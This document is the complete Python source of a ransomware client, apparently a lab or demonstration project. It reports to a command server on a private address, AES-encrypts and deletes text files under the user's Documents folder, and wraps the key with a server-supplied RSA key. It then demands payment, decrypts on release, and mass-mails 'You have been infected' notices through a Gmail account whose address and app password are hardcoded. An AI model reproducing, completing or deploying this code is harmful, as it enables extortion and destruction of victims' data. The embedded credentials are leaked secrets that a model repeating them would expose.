# general; imports
import os
import sys
from pathlib import Path
import time
# progress bar
import click
# generat random key
import random
import string
# encryption/decryption
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
# network
import socket
import uuid
import struct
# email
from email.message import EmailMessage
import smtplib
import pandas as pd
import ssl
ssl._create_default_https_context = ssl._create_unverified_context

# Server Spec
SERVER_IP = '192.168.122.1'
SERVER_PORT = 5678

# Client Paths
DOCUMENTS_PATH = Path('~/Documents').expanduser()
DESKTOP_PATH = Path('~/Desktop').expanduser()

# Client Identifier
UUID = uuid.uuid5(uuid.NAMESPACE_DNS, str(uuid.getnode()))

# Headers Spec
MESSAGE_TYPES = [b'PUB']
MESSAGE_TYPES_LENGTH = 3
INT_LENGTH = 4
HEADER_LENGTH = MESSAGE_TYPES_LENGTH + INT_LENGTH

# Infection
URL = "https://docs.google.com/spreadsheets/d/1Wcb2hzqL56QorxwBFW96QWSuyYv_x9VwiFH1nMqJCHA/gviz/tq?tqx=out:csv"
EMAIL_ADDRESSES = "eljoker.sec@gmail.com"
EMAIL_PASSWORD = "fostrghiiitesejx"


class BreakWith(Exception):
    pass


import datetime
from colorama import init, Fore, Style
init()


def print_time_color(message, color=Style.RESET_ALL, end=''):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"[{timestamp}] " + color + f"{message}" + Style.RESET_ALL + end)


def send_email(to, subject, message):
    try:
        email_address = EMAIL_ADDRESSES
        email_password = EMAIL_PASSWORD

        if email_address is None or email_password is None:
            # no email address or password
            # something is not configured properly
            print("Did you set email address and password correctly?")
            return False

        # create email
        msg = EmailMessage()
        msg['Subject'] = subject
        msg['From'] = email_address
        msg['To'] = to
        msg.set_content(message)

        # send email
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
            smtp.login(email_address, email_password)
            smtp.send_message(msg)
        return True
    except Exception as e:
        print("Problem during send email")
        print(str(e))
    return False


def receive_data(conn):
    data = conn.recv(HEADER_LENGTH)
    data_type = data[:3]
    if data_type in MESSAGE_TYPES:
        received_value = struct.unpack("!I", data[3:])[0]
        data = conn.recv(received_value)
    return data_type, data


def generate_key(length=16):
    ascii_chars = string.ascii_letters + string.digits + string.punctuation
    key = ''.join(random.choice(ascii_chars) for i in range(length))
    return key.encode()


# def get_drives():
#     partitions = psutil.disk_partitions()
#     drives = [Path(partition.device) for partition in partitions]
#     return drives


def get_files(path: Path, ext='txt'):
    files = [found.absolute() for found in path.glob(f'**/*.{ext}')]
    return files


def encrypt(path: Path, key):
    block_size = AES.block_size
    iv = os.urandom(block_size)
    output_file = path.with_suffix('.enc')
    try:
        with open(path, 'rb') as f_in, open(output_file, 'wb') as f_out:
            cipher = AES.new(key, AES.MODE_CBC, iv)
            f_out.write(iv)
            while True:
                chunk = f_in.read(block_size)
                if len(chunk) == 0:
                    break
                elif len(chunk) % block_size != 0:
                    chunk += b' ' * (block_size - len(chunk) % block_size)
                f_out.write(cipher.encrypt(chunk))
        # os.remove(path)
        path.unlink()
    except PermissionError as e:
        print(e)


def decrypt(path: Path, key):
    block_size = AES.block_size
    try:
        with open(path, 'rb') as f_in:
            iv = f_in.read(block_size)
    except FileNotFoundError as e:
        print(f'FileNotFoundError: {e}')
    except PermissionError as e:
        print(f'PermissionError: {e}')
    output_file = path.with_suffix('.txt')
    try:
        with open(path, 'rb') as f_in, open(output_file, 'wb') as f_out:
            cipher = AES.new(key, AES.MODE_CBC, iv)
            f_in.seek(block_size)
            while True:
                chunk = f_in.read(block_size)
                if len(chunk) == 0:
                    break
                f_out.write(cipher.decrypt(chunk).rstrip())
        # os.remove(path)
        path.unlink()
    except FileNotFoundError as e:
        print(f'FileNotFoundError: {e}')
    except PermissionError as e:
        print(f'PermissionError: {e}')


def encrypt_pub(public_key, data):
    public_key_obj = RSA.import_key(public_key)
    cipher = PKCS1_OAEP.new(public_key_obj)
    return cipher.encrypt(data)


def main():
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            # initiate  connection
            try:
                s.connect((SERVER_IP, SERVER_PORT))
            except ConnectionRefusedError as e:
                print_time_color("Could not connect to server", Fore.RED)
                raise BreakWith

            # define search paths
            roots = [DOCUMENTS_PATH]

            # get a list of text files paths
            text_files = []
            for root in roots:
                text_files.extend(get_files(root))

            # generate a random key
            key = generate_key(16)

            # encrypt the files
            print_time_color(
                f'Encrypting {len(text_files)} files', Fore.MAGENTA)
            header = UUID.bytes + b'ENC' + struct.pack("!I", 4)
            s.sendall(header + struct.pack("!I", len(text_files)))
            with click.progressbar(length=len(text_files)) as bar:
                for text_file in text_files:
                    encrypt(text_file, key)
                    header = UUID.bytes + b'ENC' + struct.pack("!I", 0)
                    s.send(header)
                    bar.update(1)
                    # time.sleep(1)

            # request public key
            header = UUID.bytes + b'PUB' + struct.pack("!I", 0)
            s.send(header)
            # receive public key
            _, public_key = receive_data(s)

            # write the key to a file
            with open(DESKTOP_PATH / Path('Key.key'), 'wb') as key_file:
                key_file.write(key)
                del key

            # encrypt the key
            with open(DESKTOP_PATH / Path('Key.key'), 'rb') as key_file:
                encrypted_key = encrypt_pub(public_key, key_file.read())
                with open(DESKTOP_PATH / 'encryptedKey.key', 'wb') as encrypted_key_file:
                    encrypted_key_file.write(encrypted_key)

            # decrypt the files
            input(Fore.YELLOW + "Pay To decrypt you files: " + Style.RESET_ALL)
            # send the encrypted key for the server to decryp
            with open(DESKTOP_PATH / 'encryptedKey.key', 'rb') as encypted_key_file:
                encrypted_key = encypted_key_file.read()

            header = UUID.bytes + b'ENK' + \
                struct.pack("!I", len(encrypted_key))
            s.sendall(header + encrypted_key)
            _, dec_key = receive_data(s)

            print_time_color(f'Decrypting {len(text_files)} files', Fore.GREEN)
            header = UUID.bytes + b'DEC' + struct.pack("!I", 4)
            s.sendall(header + struct.pack("!I", len(text_files)))
            with click.progressbar(length=len(text_files)) as bar:
                for text_file in text_files:
                    decrypt(text_file.with_suffix('.enc'), dec_key)
                    header = UUID.bytes + b'DEC' + struct.pack("!I", 0)
                    s.send(header)
                    bar.update(1)
                    # time.sleep(1)

            # send emails
            # send_confirm = input(Fore.YELLOW+"Do you want to send EMAILs? [Y/n]  "+Style.RESET_ALL)
            # if (send_confirm and send_confirm.lower() != "y"):
            #      raise BreakWith
            print_time_color(
                'Sending emails to the following addresses:', Fore.BLUE)
            emails = pd.read_csv(URL)['Email']
            sent_emails = ''
            for email in emails:
                sent_emails += f'- {email}' + '\n'
                print(f'- {email}')
                send_email(email, "Infection",
                           "You have been infected by a ransomware")
            header = UUID.bytes + b'EML' + \
                struct.pack("!I", len(sent_emails))

            s.sendall(header + sent_emails.encode())
            # send the termination message
            header = UUID.bytes + b'TRM' + struct.pack("!I", 0)
            s.send(header)
            print_time_color("Connection to server terminated!", Fore.RED)
    except BreakWith:
        pass
    input("Press ENTER to exit:")


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print_time_color('Interrupted', Fore.RED)
        try:
            sys.exit(0)
        except SystemExit:
            os._exit(0)
